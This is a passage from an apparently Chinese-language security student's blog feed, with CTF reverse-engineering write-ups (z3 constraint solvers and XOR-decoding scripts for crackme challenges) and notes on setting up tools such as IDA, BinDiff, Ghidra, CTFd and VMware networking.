class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><br>a = Int(<span class="hljs-string">&#x27;a&#x27;</span>)<br>b = Int(<span class="hljs-string">&#x27;b&#x27;</span>)<br><br>solver = Solver()<br><br>solver.add(a * b == <span class="hljs-number">342772773</span>)<br>solver.add(a + b == <span class="hljs-number">39526</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution&quot;</span>)<br><br><br>a, b, c, d, e, f, g, h = Ints(<span class="hljs-string">&#x27;a b c d e f g h&#x27;</span>)<br><br><br>solver = Solver()<br><br><br>solver.add((d * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>)) + (c * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>)) + (b * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + a - (<br>            (h * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>)) + (g * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>)) + (f * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + e) == <span class="hljs-number">1005712381</span>)<br>solver.add((b * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + a + (d * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + c == <span class="hljs-number">56269</span>)<br>solver.add((f * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) + e - (h * (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>)) - g == <span class="hljs-number">15092</span>)<br>solver.add(a * e == <span class="hljs-number">10710</span>)<br>solver.add(c * g == <span class="hljs-number">12051</span>)<br>solver.add(d + h == <span class="hljs-number">172</span>)<br><br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a =&quot;</span>, <span class="hljs-built_in">chr</span>(m[a].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;b =&quot;</span>, <span class="hljs-built_in">chr</span>(m[b].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>, <span class="hljs-built_in">chr</span>(m[c].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d =&quot;</span>, <span class="hljs-built_in">chr</span>(m[d].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>, <span class="hljs-built_in">chr</span>(m[e].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;f =&quot;</span>, <span class="hljs-built_in">chr</span>(m[f].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;g =&quot;</span>, <span class="hljs-built_in">chr</span>(m[g].as_long()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;h =&quot;</span>, <span class="hljs-built_in">chr</span>(m[h].as_long()))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No solution&quot;</span>)<br><br>a, b=Ints(<span class="hljs-string">&#x27;a b&#x27;</span>)<br>solver = Solver()<br>solver.add(a * b == <span class="hljs-number">171593250</span>)<br>solver.add(a + b == <span class="hljs-number">26219</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><br>a, b=Ints(<span class="hljs-string">&#x27;a b&#x27;</span>)<br>solver = Solver()<br>solver.add(a * b == <span class="hljs-number">376306868</span>)<br>solver.add(a + b == <span class="hljs-number">40341</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br><br>    m = solver.model()<br>    o = <span class="hljs-string">&quot;&quot;</span><br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[a].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &amp; <span class="hljs-number">0xff</span>))<br>    o += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[b].as_long() &gt;&gt; <span class="hljs-number">8</span>))<br>    <span class="hljs-built_in">print</span>(o)<br><span class="hljs-comment">#5h12fggtisu89521ad49</span><br></code></pre></td></tr></table></figure><h2 id="babypy-2"><a href="#babypy-2" class="headerlink" title="babypy-2"></a>babypy-2</h2><p>给了一个pyd</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884478416-3cfe8548-e269-49e7-bb9c-0642544cfa00.png" class="" title="img">不能直接反编译成python<img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711895753542-a7db57f4-5035-4dbd-a420-e732ee281bcc.png" class="" title="img"><p>记得python版本说是3.11但是uncompyle6不能反编译成c?</p><p>找字符串发现这个可能是key或者iv</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884609846-4b4f8f6b-ced3-4e49-b34f-d499f586a822.png" class="" title="img"><p>感觉是key和iv，但是怎么解都不对</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884688531-2864ddf1-b4b6-42c3-a51b-3b79b5d8fb74.png" class="" title="img"><p>估计是算法里面把key异或了或者啥的</p><img src="/2024/04/10/2024%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86Re/1711884755336-79019275-71d1-4c3d-8cc9-2bab789508de.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>比赛wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>z3</tag>
      
      <tag>cython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>和代理的一些故事</title>
    <link href="/2024/04/09/%E5%92%8C%E4%BB%A3%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%85%E4%BA%8B/"/>
    <url>/2024/04/09/%E5%92%8C%E4%BB%A3%E7%90%86%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%85%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.8.19</p><p>忘给梯子续费了，edge和谷歌都不能用了，报了网络转换错误，百度上一查让我重置网络，一点不知道后果就去试了，报错了我还以为没事，重启后就不对了。百度果然靠不住，过一会联想浏览器上所有书签都没了，大惊！</p><p>晚饭过后搞了好久都找到把重置的网络恢复的方法，系统还原了也报错了，期间要改注册表，qetx说要成仁，我觉得也还行，最后好在系统没什么事，最后只能想着找浏览记录去补收藏夹了😫😫</p><p>没补几个突然看到收藏夹那边有什么导入，一点，哇，都回来了。</p><p>我虽然想不明白原理，但还是很惊喜，算是不幸中的万幸！</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>OD与IDA结合动调</title>
    <link href="/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/"/>
    <url>/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.7.22</p><p>晚上听尧哥说DASFCTF的一道re题需要动调来判断函数先后执行的顺序，好像一下子就悟了，但悟得不多，还没完全调出来。主要网上讲动态的视频太少，只知道基本快捷键还是很难动调，所以这里记录一下</p><p>1.还有一点当函数较复杂时，伪c会不准，即放在前面的函数不一定先运行，所以需要看OD的汇编，配合IDA的伪c代码</p><p>2.一般先是在main函数的input下一个断点，然后f8单步执行，当汇编地址有较大变化的时候要去IDA里相应的汇编地址，然后按tab，看看现在位于哪个函数，以此来判断加密函数的执行先后顺序，遇到汇编循环，可以点到汇编循环的下一个位置，然后f4到该位置，快速跳出循环，因为OD是线性扫描，所以本来循环结束也是到下一条指令，两个软件的界面建议一左一右，这样就不用一直切界面，就像下面这样。</p><img src="/2024/04/07/OD%E4%B8%8EIDA%E7%BB%93%E5%90%88%E5%8A%A8%E8%B0%83/1690079441955-4d727ec8-c82d-4ece-a8b9-76ac0741bdec.png" class="" title="img"><p>3.每次调试高几位的地址不一样，不过没关系，先在IDA里开启调试，汇编界面的地址就能和OD里面对应了</p><p>4.汇编里面有函数调用函数（call）要按f7进入，此外，看伪c代码也可以看出一些函数调用关系</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BinDiff插件的报错与解决</title>
    <link href="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/"/>
    <url>/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/</url>
    
    <content type="html"><![CDATA[<p>本来BinDiff插件很多都是自带的，即使安装也很容易，但是我的dll文件无论放在plugins目录下还是安装bindiff默认创建的IDAPro文件夹都不行</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402161514589.png" class="" title="image-20240402161514589"><p>在学长的提醒下去看输出窗口的报错</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171654588.png" class="" title="image-20240402171654588"><p>那估计是先用原来系统里有的dll，删了就行</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171858007.png" class="" title="image-20240402171858007"><p>发现已经去ida目录下找了</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171402419.png" class="" title="image-20240402171402419"><p>成功</p><img src="/2024/04/02/BinDiff%E6%8F%92%E4%BB%B6%E7%9A%84%E6%8A%A5%E9%94%99%E4%B8%8E%E8%A7%A3%E5%86%B3/image-20240402171446940.png" class="" title="image-20240402171446940"><p>直接把dll放到对应ida目录下，发现多版本ida都能用了</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装ghidra</title>
    <link href="/2024/03/28/%E5%AE%89%E8%A3%85ghidra/"/>
    <url>/2024/03/28/%E5%AE%89%E8%A3%85ghidra/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.9.8</p><p>安装完了要写jdk17的目录（ghidra高版本要求java17及以上），电脑上只有jdk1.8.0，按下面教程切换java版本即可</p><img src="/2024/03/28/%E5%AE%89%E8%A3%85ghidra/1694153302506-731218f9-c283-4e36-87d5-a97bba467df1.png" class="" title="img"><p>[<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17%201%201.%20java17%E4%B8%8B%E8%BD%BD%20%E4%B8%8B%E8%BD%BD%E9%93%BE%E6%8E%A5%EF%BC%88%20https%3A%2F%2Fwww.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows%20%EF%BC%89%202,%E6%9F%A5%E7%9C%8Bjava%E7%9B%AE%E5%BD%95%20%5Broot%40r01%20~%5Dwhich%20java%20%2Fusr%2Fbin%2Fjava%201%202%20]</a>(<a href="https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=%E4%B8%80%E3%80%81windows%E5%AE%89%E8%A3%85java17%E4%B8%8Ejava8%E5%85%B1%E5%AD%98%E3%80%81centos%E5%AE%89%E8%A3%85java17">https://blog.csdn.net/niaoyi0357/article/details/125595348#:~:text=一、windows安装java17与java8共存、centos安装java17</a> 1 1. java17下载 下载链接（ https%3A%2F%2F<a href="http://www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows">www.oracle.com%2Fjava%2Ftechnologies%2Fdownloads%2F%23jdk17-windows</a> ） 2,查看java目录 [root%40r01 ~]which java %2Fusr%2Fbin%2Fjava 1 2 )</p><p>搞了两个小时，有点折磨，多关注报错和要求其实能很快解决</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单搭建CTFd</title>
    <link href="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/"/>
    <url>/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/</url>
    
    <content type="html"><![CDATA[<p>written in 2023.9.16</p><p>搞了一晚上，ubuntu上命令复制不了，麻烦。搜kali的教程，docker-compose不能正常使用，估计是设置了python2有问题，一直警告，还是先pull docker</p><p><a href="https://www.bilibili.com/read/cv16948927/">https://www.bilibili.com/read/cv16948927/</a></p><h1 id="CTFd"><a href="#CTFd" class="headerlink" title="CTFd"></a>CTFd</h1><p>安装docker</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661434139-2bb68ae4-07d2-4e3e-bf5c-a6519df585ae.png" class="" title="img"><p>启动docker</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661452074-0cdea229-ffda-4647-9a99-40dcb39e3c1d.png" class="" title="img"><p>pull 镜像</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661496732-122cff23-0e9f-40f9-ae92-0ea8fc8895cc.png" class="" title="img"><p>启动容器</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661527389-4538ed6e-2298-4568-ab74-5e4fc1c0b84d.png" class="" title="img"><p>虚拟机内启动</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661552024-5545993b-44c7-4078-a114-bdf832cd323a.png" class="" title="img"><p>注意端口</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661572673-8ee28ee4-7540-4dbc-9574-d47517593ba1.png" class="" title="img"><p>映射到本地</p><img src="/2024/03/28/%E7%AE%80%E5%8D%95%E6%90%AD%E5%BB%BACTFd/1694661587448-c9faa948-f9b2-4dd5-b439-8e7de93b9cf8.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机网络设置</title>
    <link href="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <url>/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>删除原来nat模式的虚拟网络编辑器，新建一张虚拟网卡，如vmnet0可使多台虚拟机和主机在同一网段上</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711506464849-2874c590-9c49-4934-b30e-1c43ec6687d4.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1708495363780-e2a4e9b5-6bd9-429d-98ae-e1d47c8da120.png" class="" title="img"><p>选择一张虚拟网卡，我这里选择桥接模式，或者下面的自定义选择对应网卡也行</p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711466152376-87b6d4a4-00a6-4117-90b1-5a8d0d2928ee.png" class="" title="img"><p>后面我就出现了ip不再是虚拟的192.168.15.1，但是主机还是能ping通的情况，其实之前一直是正常的，不知道咋了又还原成172.17.0.1,同学说可能是桥接会固定一段时间还原啥的</p><p>后面也遇到了虚拟机快照打不开的情况</p><p><a href="https://blog.csdn.net/qq_45771413/article/details/121230747">https://blog.csdn.net/qq_45771413/article/details/121230747</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711516508625-7ce053f6-dc2a-4d28-94a4-fdfb2e8d9aa3.png" class="" title="img"><p>最后把网络适配器全部还原成默认的，再按照教程全部设置成NAT</p><p><a href="https://zhuanlan.zhihu.com/p/479522879">https://zhuanlan.zhihu.com/p/479522879</a></p><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711519056690-363480f0-5b01-4803-a93e-d9cc77b92531.png" class="" title="img"><img src="/2024/03/27/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/1711521124605-41af9189-016e-467d-a9a2-b3a3b1af398b.png" class="" title="img"><p>发现还是不行，我真的…</p><p>再次恢复快照，竟然成了，所以还得是拍快照</p>]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>安装pngcheck</title>
    <link href="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/"/>
    <url>/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/</url>
    
    <content type="html"><![CDATA[<h2 id="安装pngcheck"><a href="#安装pngcheck" class="headerlink" title="安装pngcheck"></a>安装pngcheck</h2><p>written in 2023.9.26</p><p>阿里云的源找不到</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737968243-87e7a061-8436-4375-aae7-39bca5a291e6.png" class="" title="img"><p>同学反映可能是用了阿里云源的关系，所以第一种方法是换源，用kali原来的源就能一键成功</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695738257858-862a66bc-871b-48be-b183-1daa9d0b9d8d.png" class="" title="img"><p>翻github找到一个更新的网站，下载对应的版本就行了</p><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737936166-d9838d33-6c94-46f8-b1dd-fd7f3999a96a.png" class="" title="img"><img src="/2024/03/26/%E5%AE%89%E8%A3%85pngcheck/1695737866998-d5a52522-3c03-4b2b-bcd7-36f95acd13e5.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>环境配置</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BeginCTF2024部分逆向</title>
    <link href="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/"/>
    <url>/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h2 id="real-xor"><a href="#real-xor" class="headerlink" title="real_xor"></a>real_xor</h2><p>给的python，一眼循环异或</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768782798-eec1722c-ad82-437c-910b-c5bec0b5e2a7.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706768772317-486bf981-83da-4045-bba6-ab4b7bdc6fbf.png" class="" title="img"><h2 id="xor-1"><a href="#xor-1" class="headerlink" title="xor-1"></a>xor-1</h2><p>先脱壳</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769025393-674705ad-19fe-4c58-b922-5ad9534aecf9.png" class="" title="img"><p>搜字符串找到密文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706769305346-03366f20-0aa3-4f9d-b7f9-34f304e56d7e.png" class="" title="img"><p>从start进入，找到code</p><p>复制数字和明文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5-171031959456491.png" class="" title="img"><p>异或数字</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706770953655-d4f571cc-a702-41b7-8251-6325c3af1ab5.png" class="" title="img"><p>反向异或，其实伪c是很奇怪的i&#x3D;0，下标为16，但是看汇编确实是这样</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771152553-c42a1f1b-5dee-40ee-b4eb-9e30175b2302.png" class="" title="img"><p>而且c用16来算就是对的</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707395333436-2cec64dd-319f-4d7a-9dcc-de5a5b096cdf.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771290662-3a9f9e22-8956-4a79-92e3-561d8416c75e.png" class="" title="img"><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771400265-4ff2b282-a49c-44a2-86fb-3aa642825f63.png" class="" title="img"><p>又来一整轮</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1706771420376-7ce963ce-71da-49f4-9c99-e1c3e74fc6ad.png" class="" title="img"><p>ida7.5可以显示中文</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379783930-63154982-9c14-47c6-82e5-9c06f709b51c.png" class="" title="img"><p>当时就这样，直接乱序</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707379763193-a6214394-7f51-43f0-8b96-9fee716c6e44.png" class="" title="img"><p>我知道了，我写的脚本是一位一位的加到flag里，而现实是16位算完直接复制的，当然有点问题，第一个f没了</p><img src="/2024/03/13/BeginCTF2024%E9%83%A8%E5%88%86%E9%80%86%E5%90%91/1707380357812-aba19fb3-0169-4122-938c-7aabf4d3660e.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python">fin = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;`agh&#123;^bvuwTooahlYocPtmyiijj|ek&#x27;p&quot;</span>]<br><br>lst9 = fin[:<span class="hljs-number">16</span>]<br>lst8 = fin[<span class="hljs-number">16</span>:]<br><br>lst7 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;3092606632787947&quot;</span>]<br>lst6 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;4180387362590136&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst7[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[<span class="hljs-number">16</span>-i]<br>    lst9[i] ^= lst6[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst6[i]<br>    lst9[i] ^= lst7[i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst8[i] ^= lst7[i]<br>    lst9[i] ^= lst6[i]<br><br>lst4 = lst8<br>lst3 = lst9<br><br>lst1 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;6329079420771558&quot;</span>]<br>lst2 = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;7679621386735000&quot;</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst2[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>):<br>    lst3[i] ^= lst2[<span class="hljs-number">16</span>-i]<br>    lst4[i] ^= lst1[<span class="hljs-number">16</span>-i]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>    lst3[i] ^= lst1[i]<br>    lst4[i] ^= lst2[i]<br><br><span 